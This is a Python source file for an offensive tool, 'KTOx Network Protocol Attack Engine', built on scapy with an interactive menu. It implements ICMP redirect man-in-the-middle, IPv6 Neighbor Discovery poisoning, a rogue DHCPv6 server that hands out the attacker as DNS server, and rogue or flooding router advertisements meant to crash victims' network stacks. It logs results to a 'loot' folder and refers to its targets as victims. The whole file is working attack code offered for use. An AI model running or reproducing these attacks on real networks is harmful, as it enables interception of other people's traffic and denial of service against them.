#!/usr/bin/env python3
# -.- coding: utf-8 -.-
# ktox_netattack.py — KTOx Network Protocol Attack Engine v1.0
#
# Modules:
#   · ICMP Redirect Attack    — stealthy MITM alternative to ARP spoofing
#   · NDP Spoofer             — IPv6 Neighbor Discovery poisoning (IPv6's ARP)
#   · DHCPv6 Spoofer          — become the IPv6 DHCP server
#   · Router Advertisement    — flood/spoof IPv6 router advertisements
#   · IPv6 MITM               — full dual-stack intercept

import os, sys, re, time, json, socket, struct, threading, logging
from datetime import datetime

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    from scapy.all import *
    from scapy.layers.inet6 import (
        IPv6, ICMPv6ND_NS, ICMPv6ND_NA, ICMPv6ND_RS, ICMPv6ND_RA,
        ICMPv6NDOptDstLLAddr, ICMPv6NDOptSrcLLAddr, ICMPv6NDOptPrefixInfo,
        ICMPv6NDOptMTU, ICMPv6EchoRequest, ICMPv6EchoReply,
        DHCP6_Solicit, DHCP6_Advertise, DHCP6_Request, DHCP6_Reply,
        DHCP6OptIAAddress, DHCP6OptIA_NA, DHCP6OptDNSServers,
        DHCP6OptServerId, DHCP6OptClientId, DHCP6_RelayForward
    )
    from scapy.config import conf as sconf
except ImportError as e:
    print(f"ERROR: scapy IPv6 layers — {e}\npip3 install scapy"); sys.exit(1)

try:
    from rich.console import Console
    from rich.panel   import Panel
    from rich.table   import Table
    from rich.rule    import Rule
    from rich.prompt  import Prompt, Confirm
    from rich         import box
except ImportError:
    print("ERROR: pip3 install rich"); sys.exit(1)

console   = Console(highlight=False)
loot_dir  = "ktox_loot"
stop_flag = threading.Event()

C_BLOOD  = "#C0392B"
C_RUST   = "#922B21"
C_EMBER  = "#E74C3C"
C_STEEL  = "#717D7E"
C_ASH    = "#ABB2B9"
C_WHITE  = "#F2F3F4"
C_DIM    = "#566573"
C_ORANGE = "#CA6F1E"
C_YELLOW = "#D4AC0D"
C_GOOD   = "#1E8449"

def tag(t, c=C_BLOOD): return f"[{c}]{t}[/{c}]"
def ok(t):    console.print(f"  [{C_GOOD}]✔  {t}[/{C_GOOD}]")
def warn(t):  console.print(f"  [{C_ORANGE}]⚠  {t}[/{C_ORANGE}]")
def err(t):   console.print(f"  [{C_BLOOD}]✖  {t}[/{C_BLOOD}]")
def info(t):  console.print(f"  [{C_STEEL}]ℹ  {t}[/{C_STEEL}]")

def section(t):
    console.print()
    console.print(Rule(f"[bold {C_BLOOD}] {t} [/bold {C_BLOOD}]", style=C_RUST))
    console.print()

def _loot(event, data):
    os.makedirs(loot_dir, exist_ok=True)
    path  = os.path.join(loot_dir, "netattack.log")
    entry = {"ts": datetime.now().isoformat(), "event": event, "data": data}
    try:
        with open(path, "a") as f:
            f.write(json.dumps(entry) + "\n")
    except: pass

def _enable_ipforward():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f: f.write("1\n")
        with open("/proc/sys/net/ipv6/conf/all/forwarding", "w") as f: f.write("1\n")
        ok("IP forwarding enabled (IPv4 + IPv6)")
    except: warn("Could not enable IP forwarding")


# ══════════════════════════════════════════════════════════════════════════════
# ── ICMP REDIRECT ATTACK ──────────────────────────────────════════════════════
# ══════════════════════════════════════════════════════════════════════════════

class ICMPRedirectAttack:
    """
    Stealthy MITM alternative to ARP spoofing.

    ARP spoofing changes what MAC address maps to an IP.
    ICMP Redirect changes what ROUTE a host uses.

    Sends forged ICMP Type 5 (Redirect) packets to victims, telling them
    to route traffic through the attacker instead of the gateway.
    Works on networks with ARP monitoring/DAI deployed.

    How it works:
        1. Attacker impersonates the gateway
        2. Sends ICMP Redirect to victim: "Route X.X.X.X through me"
        3. Victim updates routing table (not ARP cache)
        4. Traffic flows through attacker

    Limitations:
        - Modern Linux kernels ignore ICMP redirects by default
        - Windows accepts them freely (effective on Windows targets)
        - Must appear to come from the gateway IP
    """

    def __init__(self, iface, gateway_ip, gateway_mac,
                 target_ip, redirect_to_ip=None,
                 destination="0.0.0.0"):
        self.iface         = iface
        self.gateway_ip    = gateway_ip
        self.gateway_mac   = gateway_mac
        self.target_ip     = target_ip
        self.redirect_to   = redirect_to_ip or self._get_own_ip()
        self.destination   = destination   # which dest to redirect (0.0.0.0=all)
        self._thread       = None

    def _get_own_ip(self):
        try: return get_if_addr(self.iface)
        except: return "0.0.0.0"

    def _build_redirect(self, dest_ip):
        """
        Build ICMP redirect packet spoofed from gateway.
        Type 5, Code 1 = Redirect for Host.
        """
        return (
            Ether(src=self.gateway_mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src=self.gateway_ip, dst=self.target_ip) /
            ICMP(
                type=5,        # Redirect
                code=1,        # Redirect for Host
                gw=self.redirect_to
            ) /
            IP(src=self.target_ip, dst=dest_ip) /
            UDP(sport=1234, dport=53)
        )

    def _attack_loop(self, interval, cap):
        sent = [0]
        while not stop_flag.is_set():
            try:
                # Redirect to common internet destinations
                for dest in ["8.8.8.8", "1.1.1.1", self.destination]:
                    if stop_flag.is_set(): break
                    pkt = self._build_redirect(dest)
                    sendp(pkt, iface=self.iface, verbose=False)
                    sent[0] += 1

                if sent[0] % 10 == 0:
                    console.print(
                        f"  [{C_DIM}]ICMP redirects sent: {sent[0]}[/{C_DIM}]",
                        end="\r"
                    )
                if cap and sent[0] >= cap:
                    stop_flag.set(); break

                time.sleep(interval)

            except Exception as e:
                if not stop_flag.is_set():
                    warn(f"Send error: {e}")
                break

        console.print()
        ok(f"ICMP redirect attack stopped — {sent[0]} redirects sent.")
        _loot("ICMP_REDIRECT_STOP", {"sent": sent[0], "target": self.target_ip})

    def start(self, interval=2.0, cap=0):
        section("ICMP REDIRECT ATTACK")

        console.print(Panel(
            f"  {tag('Target:',       C_BLOOD)}   [{C_WHITE}]{self.target_ip}[/{C_WHITE}]\n"
            f"  {tag('Spoofed GW:',   C_STEEL)}   [{C_ASH}]{self.gateway_ip} ({self.gateway_mac})[/{C_ASH}]\n"
            f"  {tag('Redirect to:',  C_EMBER)}   [{C_EMBER}]{self.redirect_to}[/{C_EMBER}]\n"
            f"  {tag('Interval:',     C_DIM)}     [{C_DIM}]{interval}s[/{C_DIM}]\n\n"
            f"  [{C_ASH}]Tells victim to route all traffic through attacker.\n"
            f"  More stealthy than ARP — modifies routing table not ARP cache.\n"
            f"  Most effective against Windows targets.[/{C_ASH}]",
            border_style=C_RUST,
            title=f"[bold {C_BLOOD}]◈ ICMP REDIRECT[/bold {C_BLOOD}]",
            padding=(1,2)
        ))

        _enable_ipforward()
        stop_flag.clear()
        _loot("ICMP_REDIRECT_START", {
            "target": self.target_ip,
            "gateway": self.gateway_ip,
            "redirect_to": self.redirect_to
        })

        self._thread = threading.Thread(
            target=self._attack_loop, args=(interval, cap), daemon=True
        )
        self._thread.start()
        info("Ctrl+C to stop.\n")

        try:
            while not stop_flag.is_set():
                time.sleep(0.5)
        except KeyboardInterrupt:
            stop_flag.set()

    def stop(self):
        stop_flag.set()
        info("Restoring victim routing (sending legitimate redirect back)...")
        pkt = (
            Ether(src=self.gateway_mac) /
            IP(src=self.gateway_ip, dst=self.target_ip) /
            ICMP(type=5, code=1, gw=self.gateway_ip) /
            IP(src=self.target_ip, dst="8.8.8.8") /
            UDP(sport=1234, dport=53)
        )
        sendp(pkt, iface=self.iface, verbose=False, count=3)
        ok("Routing restored.")


# ══════════════════════════════════════════════════════════════════════════════
# ── NDP SPOOFER (IPv6) ────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

class NDPSpoofer:
    """
    IPv6 Neighbor Discovery Protocol poisoning — the IPv6 equivalent of ARP spoofing.

    NDP uses ICMPv6 Neighbor Solicitation / Advertisement messages to map
    IPv6 addresses to MAC addresses. KTOx sends forged NA packets claiming
    to own the gateway's IPv6 address, intercepting all IPv6 traffic.

    Also poisons the gateway so both directions are intercepted.
    """

    def __init__(self, iface, target_ipv6, gateway_ipv6,
                 attacker_mac=None, interval=2.0):
        self.iface        = iface
        self.target_ipv6  = target_ipv6
        self.gateway_ipv6 = gateway_ipv6
        self.attacker_mac = attacker_mac or get_if_hwaddr(iface)
        self.interval     = interval
        self._thread      = None

    def _na_packet(self, src_ipv6, dst_ipv6, target_ipv6):
        """
        Forge ICMPv6 Neighbor Advertisement claiming to own target_ipv6.
        """
        return (
            Ether(dst="33:33:00:00:00:01") /   # IPv6 multicast MAC
            IPv6(src=src_ipv6, dst=dst_ipv6) /
            ICMPv6ND_NA(
                tgt=target_ipv6,
                R=0,   # not a router
                S=1,   # solicited
                O=1    # override existing cache
            ) /
            ICMPv6NDOptDstLLAddr(lladdr=self.attacker_mac)
        )

    def _loop(self):
        while not stop_flag.is_set():
            try:
                # Poison target: gateway IPv6 → attacker MAC
                pkt1 = self._na_packet(
                    self.gateway_ipv6,
                    self.target_ipv6,
                    self.gateway_ipv6
                )
                sendp(pkt1, iface=self.iface, verbose=False)

                # Poison gateway: target IPv6 → attacker MAC
                pkt2 = self._na_packet(
                    self.target_ipv6,
                    self.gateway_ipv6,
                    self.target_ipv6
                )
                sendp(pkt2, iface=self.iface, verbose=False)

                ts = datetime.now().strftime("%H:%M:%S")
                console.print(
                    f"  [{C_BLOOD}]NDP[/{C_BLOOD}]  "
                    f"[{C_WHITE}]{self.target_ipv6}[/{C_WHITE}] ↔ "
                    f"[{C_STEEL}]{self.gateway_ipv6}[/{C_STEEL}]  "
                    f"[{C_DIM}]poisoned  {ts}[/{C_DIM}]"
                )

            except Exception as e:
                if not stop_flag.is_set():
                    warn(f"NDP send error: {e}")
                break

            time.sleep(self.interval)

    def start(self):
        section("NDP SPOOFER — IPv6 MITM")

        console.print(Panel(
            f"  {tag('Target IPv6:',  C_BLOOD)}   [{C_WHITE}]{self.target_ipv6}[/{C_WHITE}]\n"
            f"  {tag('Gateway IPv6:', C_STEEL)}   [{C_ASH}]{self.gateway_ipv6}[/{C_ASH}]\n"
            f"  {tag('Attacker MAC:', C_EMBER)}   [{C_EMBER}]{self.attacker_mac}[/{C_EMBER}]\n"
            f"  {tag('Interval:',     C_DIM)}     [{C_DIM}]{self.interval}s[/{C_DIM}]\n\n"
            f"  [{C_ASH}]Sends forged ICMPv6 Neighbor Advertisements.\n"
            f"  IPv6 equivalent of ARP spoofing — poisons NDPcache\n"
            f"  on both target and gateway for bidirectional intercept.[/{C_ASH}]",
            border_style=C_RUST,
            title=f"[bold {C_BLOOD}]◈ NDP SPOOFER[/bold {C_BLOOD}]",
            padding=(1,2)
        ))

        _enable_ipforward()
        stop_flag.clear()
        _loot("NDP_SPOOF_START", {
            "target": self.target_ipv6,
            "gateway": self.gateway_ipv6
        })

        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        info("NDP poisoning active. Ctrl+C to stop.\n")

        try:
            while not stop_flag.is_set():
                time.sleep(0.5)
        except KeyboardInterrupt:
            stop_flag.set()

        self.restore()

    def restore(self):
        """Send legitimate NAs to fix the NDPcache."""
        stop_flag.set()
        info("Restoring NDP cache...")
        try:
            # Get real MACs via NDP
            import subprocess
            r = subprocess.run(["ip", "-6", "neigh"], capture_output=True, text=True)
            for line in r.stdout.splitlines():
                if self.gateway_ipv6 in line:
                    real_mac = re.search(r'lladdr\s+([\w:]+)', line)
                    if real_mac:
                        pkt = self._na_packet(
                            self.gateway_ipv6,
                            self.target_ipv6,
                            self.gateway_ipv6
                        )
                        pkt[ICMPv6NDOptDstLLAddr].lladdr = real_mac.group(1)
                        sendp(pkt, iface=self.iface, verbose=False, count=3)
            ok("NDP cache restoration attempted.")
        except Exception as e:
            warn(f"Restore failed: {e}")


# ══════════════════════════════════════════════════════════════════════════════
# ── ROUTER ADVERTISEMENT FLOOD ────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

class RAFlood:
    """
    IPv6 Router Advertisement attack.

    Legitimate RA: router announces itself and hands out IPv6 prefixes.
    Attack modes:
        1. Rogue RA  — claim to be the router, redirect all IPv6 traffic
        2. RA Flood  — spam thousands of RA with random prefixes, causing
                       victim to auto-configure hundreds of IPv6 addresses
                       and potentially crashing the network stack (DoS)
        3. SLAAC MITM — hand out prefix that routes through attacker
    """

    def __init__(self, iface, attacker_mac=None, attacker_ipv6=None,
                 mode="rogue", prefix="fd00:dead:beef::/64"):
        self.iface         = iface
        self.attacker_mac  = attacker_mac or get_if_hwaddr(iface)
        self.attacker_ipv6 = attacker_ipv6 or self._get_link_local()
        self.mode          = mode    # "rogue" | "flood" | "dos"
        self.prefix        = prefix
        self._thread       = None

    def _get_link_local(self):
        try:
            result = subprocess.run(
                ["ip", "-6", "addr", "show", "scope", "link"],
                capture_output=True, text=True
            )
            m = re.search(r'inet6\s+(fe80[:\w]+)/\d+', result.stdout)
            return m.group(1) if m else "fe80::1"
        except:
            return "fe80::1"

    def _build_rogue_ra(self, prefix=None):
        """RA claiming to be default router."""
        prefix = prefix or self.prefix
        net, length = prefix.split("::/")
        return (
            Ether(src=self.attacker_mac, dst="33:33:00:00:00:01") /
            IPv6(src=self.attacker_ipv6, dst="ff02::1") /
            ICMPv6ND_RA(
                chlim=64,
                M=0,     # managed address config (0=SLAAC)
                O=0,     # other config
                H=0,     # home agent
                prf=1,   # high preference (makes victims prefer this router)
                routerlifetime=9000,
                reachabletime=30000,
                retranstimer=1000
            ) /
            ICMPv6NDOptPrefixInfo(
                prefixlen=int(length),
                L=1,     # on-link
                A=1,     # autonomous address config
                validlifetime=0xffffffff,
                preferredlifetime=0xffffffff,
                prefix=net + "::"
            ) /
            ICMPv6NDOptSrcLLAddr(lladdr=self.attacker_mac) /
            ICMPv6NDOptMTU(mtu=1500)
        )

    def _flood_loop(self):
        sent = [0]
        while not stop_flag.is_set():
            try:
                if self.mode == "flood":
                    # Random prefix each time → victim gets flooded with routes
                    rand_prefix = f"fd{random.randint(0,255):02x}:{random.randint(0,65535):04x}::{random.randint(0,65535):04x}::/64"
                    pkt = self._build_rogue_ra(rand_prefix)
                else:
                    pkt = self._build_rogue_ra()

                sendp(pkt, iface=self.iface, verbose=False)
                sent[0] += 1

                if sent[0] % 10 == 0:
                    ts = datetime.now().strftime("%H:%M:%S")
                    console.print(
                        f"  [{C_BLOOD}]RA[/{C_BLOOD}]  "
                        f"[{C_DIM}]{sent[0]} advertisements sent  {ts}[/{C_DIM}]",
                        end="\r"
                    )

            except Exception as e:
                if not stop_flag.is_set():
                    warn(f"RA send error: {e}")
                break

            time.sleep(0.1 if self.mode == "flood" else 5)

    def start(self):
        section(f"ROUTER ADVERTISEMENT — {self.mode.upper()}")

        descriptions = {
            "rogue":  "Claims to be default IPv6 router. All IPv6 traffic routes through attacker.",
            "flood":  "Sends RAs with random prefixes. Victim auto-configures hundreds of addresses (DoS).",
            "slaac":  "SLAAC-based MITM. Victims use attacker's prefix, routing through attacker.",
        }

        console.print(Panel(
            f"  {tag('Mode:',     C_BLOOD)}   [{C_WHITE}]{self.mode}[/{C_WHITE}]\n"
            f"  {tag('Source:',   C_STEEL)}   [{C_ASH}]{self.attacker_ipv6}[/{C_ASH}]\n"
            f"  {tag('Prefix:',   C_EMBER)}   [{C_EMBER}]{self.prefix}[/{C_EMBER}]\n\n"
            f"  [{C_ASH}]{descriptions.get(self.mode, '')}[/{C_ASH}]",
            border_style=C_RUST,
            title=f"[bold {C_BLOOD}]◈ RA FLOOD[/bold {C_BLOOD}]",
            padding=(1,2)
        ))

        _enable_ipforward()
        stop_flag.clear()
        _loot("RA_FLOOD_START", {
            "mode": self.mode,
            "prefix": self.prefix
        })

        self._thread = threading.Thread(target=self._flood_loop, daemon=True)
        self._thread.start()
        info("Ctrl+C to stop.\n")

        try:
            while not stop_flag.is_set():
                time.sleep(0.5)
        except KeyboardInterrupt:
            stop_flag.set()
            console.print()
            ok("RA flood stopped.")


# ══════════════════════════════════════════════════════════════════════════════
# ── DHCPv6 SPOOFER ────────────────────────────════════════════════════════════
# ══════════════════════════════════════════════════════════════════════════════

class DHCPv6Spoofer:
    """
    Rogue DHCPv6 server. Responds to DHCPv6 Solicit messages with
    Advertise/Reply packets, handing out attacker as DNS server.
    Sets attacker as the IPv6 DNS server so all DNS queries come through us.
    """

    def __init__(self, iface, attacker_ipv6, dns_ipv6=None):
        self.iface        = iface
        self.attacker_ipv6= attacker_ipv6
        self.dns_ipv6     = dns_ipv6 or attacker_ipv6
        self._thread      = None
        self._leases      = {}

    def _handle(self, pkt):
        if not pkt.haslayer(IPv6): return
        if not pkt.haslayer(DHCP6_Solicit): return

        src_mac = pkt[Ether].src if pkt.haslayer(Ether) else "unknown"
        src_ipv6= pkt[IPv6].src
        ts      = datetime.now().strftime("%H:%M:%S")

        console.print(
            f"  [{C_YELLOW}]DHCPv6 SOLICIT[/{C_YELLOW}]  "
            f"[{C_WHITE}]{src_mac}[/{C_WHITE}]  [{C_DIM}]{ts}[/{C_DIM}]"
        )

        # Generate a lease address
        import hashlib
        h = hashlib.md5(src_mac.encode()).hexdigest()
        lease_addr = f"fd00:dead:beef::{h[:4]}:{h[4:8]}"
        self._leases[src_mac] = lease_addr

        # Build Advertise response
        sol    = pkt[DHCP6_Solicit]
        trid   = sol.trid

        resp = (
            Ether(src=get_if_hwaddr(self.iface), dst=pkt[Ether].src) /
            IPv6(src=self.attacker_ipv6, dst=src_ipv6) /
            UDP(sport=547, dport=546) /
            DHCP6_Advertise(trid=trid) /
            DHCP6OptServerId() /
            DHCP6OptClientId() /
            DHCP6OptIA_NA(iaid=1) /
            DHCP6OptIAAddress(addr=lease_addr, preflft=3600, validlft=7200) /
            DHCP6OptDNSServers(dnsservers=[self.dns_ipv6])
        )

        sendp(resp, iface=self.iface, verbose=False)
        console.print(
            f"  [{C_BLOOD}]⚡ DHCPv6 OFFER[/{C_BLOOD}]  "
            f"[{C_WHITE}]{src_mac}[/{C_WHITE}] → "
            f"[{C_EMBER}]{lease_addr}[/{C_EMBER}]  "
            f"DNS: [{C_EMBER}]{self.dns_ipv6}[/{C_EMBER}]"
        )
        _loot("DHCPV6_LEASE", {
            "client_mac": src_mac,
            "assigned_ipv6": lease_addr,
            "dns": self.dns_ipv6
        })

    def start(self):
        section("DHCPv6 SPOOFER")

        console.print(Panel(
            f"  {tag('Attacker IPv6:', C_BLOOD)}  [{C_WHITE}]{self.attacker_ipv6}[/{C_WHITE}]\n"
            f"  {tag('DNS IPv6:',      C_STEEL)}  [{C_ASH}]{self.dns_ipv6}[/{C_ASH}]\n\n"
            f"  [{C_ASH}]Responds to DHCPv6 Solicit broadcasts.\n"
            f"  Hands out attacker as IPv6 DNS server.\n"
            f"  All DNS queries from victims will resolve through us.[/{C_ASH}]",
            border_style=C_RUST,
            title=f"[bold {C_BLOOD}]◈ DHCPv6 SPOOFER[/bold {C_BLOOD}]",
            padding=(1,2)
        ))

        stop_flag.clear()
        _loot("DHCPV6_START", {"attacker": self.attacker_ipv6, "dns": self.dns_ipv6})

        info("Listening for DHCPv6 Solicit messages (UDP/546)...")
        info("Ctrl+C to stop.\n")

        try:
            sniff(
                iface=self.iface,
                filter="udp and port 547",
                prn=self._handle,
                store=False,
                stop_filter=lambda _: stop_flag.is_set()
            )
        except KeyboardInterrupt:
            stop_flag.set()
        finally:
            ok(f"DHCPv6 stopped — {len(self._leases)} lease(s) issued.")
            _loot("DHCPV6_STOP", {"leases": len(self._leases)})


# ══════════════════════════════════════════════════════════════════════════════
# ── IPv6 SCANNER ──────────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

class IPv6Scanner:
    """
    Discover IPv6 hosts on the LAN using ICMPv6 Neighbor Solicitation.
    Also listens for RA messages to identify IPv6 routers.
    """

    def __init__(self, iface):
        self.iface   = iface
        self.hosts   = {}
        self.routers = {}

    def _handle(self, pkt):
        if not pkt.haslayer(IPv6): return
        ts  = datetime.now().strftime("%H:%M:%S")
        src = pkt[IPv6].src
        mac = pkt[Ether].src if pkt.haslayer(Ether) else "?"

        if src.startswith("fe80") or src == "::": return  # skip link-local noise

        if pkt.haslayer(ICMPv6ND_NA) or pkt.haslayer(ICMPv6ND_NS):
            if src not in self.hosts:
                self.hosts[src] = {"mac": mac, "ts": ts}
                console.print(
                    f"  [{C_YELLOW}]IPv6 HOST[/{C_YELLOW}]  "
                    f"[{C_WHITE}]{src:45s}[/{C_WHITE}]  "
                    f"[{C_STEEL}]{mac}[/{C_STEEL}]  [{C_DIM}]{ts}[/{C_DIM}]"
                )

        elif pkt.haslayer(ICMPv6ND_RA):
            if src not in self.routers:
                self.routers[src] = {"mac": mac, "ts": ts}
                console.print(
                    f"  [{C_BLOOD}]IPv6 ROUTER[/{C_BLOOD}]  "
                    f"[{C_WHITE}]{src:45s}[/{C_WHITE}]  "
                    f"[{C_STEEL}]{mac}[/{C_STEEL}]  [{C_DIM}]{ts}[/{C_DIM}]"
                )

    def _send_rs(self):
        """Send Router Solicitation to discover routers."""
        pkt = (
            Ether(dst="33:33:00:00:00:02") /
            IPv6(dst="ff02::2") /
            ICMPv6ND_RS()
        )
        sendp(pkt, iface=self.iface, verbose=False)

    def _send_ns(self):
        """Send Neighbor Solicitation to trigger NA responses."""
        pkt = (
            Ether(dst="33:33:ff:00:00:00") /
            IPv6(dst="ff02::1:ff00:0") /
            ICMPv6ND_NS(tgt="ff02::1")
        )
        sendp(pkt, iface=self.iface, verbose=False)

    def scan(self, duration=15):
        section("IPv6 HOST DISCOVERY")
        info(f"Sending RS + NS probes, listening {duration}s...")

        stop_flag.clear()

        threading.Thread(target=self._send_rs, daemon=True).start()
        threading.Thread(target=self._send_ns, daemon=True).start()

        try:
            sniff(
                iface=self.iface,
                filter="icmp6",
                prn=self._handle,
                store=False,
                timeout=duration,
                stop_filter=lambda _: stop_flag.is_set()
            )
        except KeyboardInterrupt:
            stop_flag.set()

        console.print(
            f"\n  [{C_STEEL}]{len(self.hosts)} host(s)  "
            f"{len(self.routers)} router(s)[/{C_STEEL}]"
        )
        _loot("IPV6_SCAN", {
            "hosts": len(self.hosts),
            "routers": len(self.routers)
        })
        return self.hosts, self.routers


# ══════════════════════════════════════════════════════════════════════════════
# ── MENU ─────────────────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

def netattack_menu(iface, gateway_ip, gateway_mac):
    """Interactive network attack menu."""

    while True:
        section("NETWORK ATTACK ENGINE")
        console.print(f"""
  [{C_BLOOD}]── ICMP ─────────────────────────────────────────────[/{C_BLOOD}]
  [{C_BLOOD}][1][/{C_BLOOD}]  [{C_ASH}]ICMP Redirect Attack   Stealthy MITM via routing table[/{C_ASH}]

  [{C_BLOOD}]── IPv6 ─────────────────────────────────────────────[/{C_BLOOD}]
  [{C_BLOOD}][2][/{C_BLOOD}]  [{C_ASH}]IPv6 Host Scanner      Discover IPv6 hosts + routers[/{C_ASH}]
  [{C_BLOOD}][3][/{C_BLOOD}]  [{C_ASH}]NDP Spoofer            IPv6 MITM (ICMPv6 NA poison)[/{C_ASH}]
  [{C_BLOOD}][4][/{C_BLOOD}]  [{C_ASH}]DHCPv6 Spoofer         Rogue IPv6 DHCP + DNS server[/{C_ASH}]
  [{C_BLOOD}][5][/{C_BLOOD}]  [{C_ASH}]Router Advertisement   Rogue RA / RA Flood[/{C_ASH}]

  [{C_BLOOD}][E][/{C_BLOOD}]  [{C_ASH}]Back[/{C_ASH}]
""")

        choice = Prompt.ask(f"  [{C_BLOOD}]netattack>[/{C_BLOOD}]").strip().upper()
        if choice == "E": return

        try:
            if choice == "1":
                target = Prompt.ask(f"  [{C_BLOOD}]Target IP[/{C_BLOOD}]")
                redir  = Prompt.ask(
                    f"  [{C_STEEL}]Redirect to IP [{C_DIM}]blank=this machine[/{C_DIM}][/{C_STEEL}]",
                    default=""
                )
                interval = float(Prompt.ask(
                    f"  [{C_STEEL}]Interval seconds[/{C_STEEL}]", default="2.0"
                ))
                attack = ICMPRedirectAttack(
                    iface, gateway_ip, gateway_mac,
                    target, redir or None
                )
                attack.start(interval=interval)

            elif choice == "2":
                duration = int(Prompt.ask(
                    f"  [{C_STEEL}]Scan duration seconds[/{C_STEEL}]", default="15"
                ))
                scanner = IPv6Scanner(iface)
                scanner.scan(duration)

            elif choice == "3":
                target_v6  = Prompt.ask(f"  [{C_BLOOD}]Target IPv6[/{C_BLOOD}]")
                gateway_v6 = Prompt.ask(f"  [{C_STEEL}]Gateway IPv6[/{C_STEEL}]")
                interval   = float(Prompt.ask(
                    f"  [{C_STEEL}]Interval seconds[/{C_STEEL}]", default="2.0"
                ))
                spoofer = NDPSpoofer(iface, target_v6, gateway_v6,
                                     interval=interval)
                spoofer.start()

            elif choice == "4":
                attacker_v6 = Prompt.ask(
                    f"  [{C_BLOOD}]Attacker IPv6[/{C_BLOOD}]"
                )
                dns_v6 = Prompt.ask(
                    f"  [{C_STEEL}]DNS IPv6 [{C_DIM}]blank=same as attacker[/{C_DIM}][/{C_STEEL}]",
                    default=""
                )
                spoofer = DHCPv6Spoofer(iface, attacker_v6,
                                         dns_v6 or attacker_v6)
                spoofer.start()

            elif choice == "5":
                modes = ["rogue", "flood", "slaac"]
                console.print(f"  [{C_STEEL}]Modes: {', '.join(modes)}[/{C_STEEL}]")
                mode   = Prompt.ask(f"  [{C_BLOOD}]Mode[/{C_BLOOD}]", default="rogue")
                prefix = Prompt.ask(
                    f"  [{C_STEEL}]IPv6 prefix[/{C_STEEL}]",
                    default="fd00:dead:beef::/64"
                )
                flood = RAFlood(iface, mode=mode, prefix=prefix)
                flood.start()

            else:
                console.print(f"  [{C_ORANGE}]Invalid option.[/{C_ORANGE}]")

        except KeyboardInterrupt:
            stop_flag.set()
            console.print(f"\n  [{C_ORANGE}]Interrupted.[/{C_ORANGE}]")
            stop_flag.clear()
        except Exception as ex:
            err(f"Error: {ex}")
            import traceback; traceback.print_exc()


if __name__ == "__main__":
    if os.geteuid() != 0:
        print("ERROR: Must run as root"); sys.exit(1)
    iface      = Prompt.ask("Interface", default="eth0")
    gateway_ip = Prompt.ask("Gateway IP")
    gateway_mac= Prompt.ask("Gateway MAC")
    netattack_menu(iface, gateway_ip, gateway_mac)
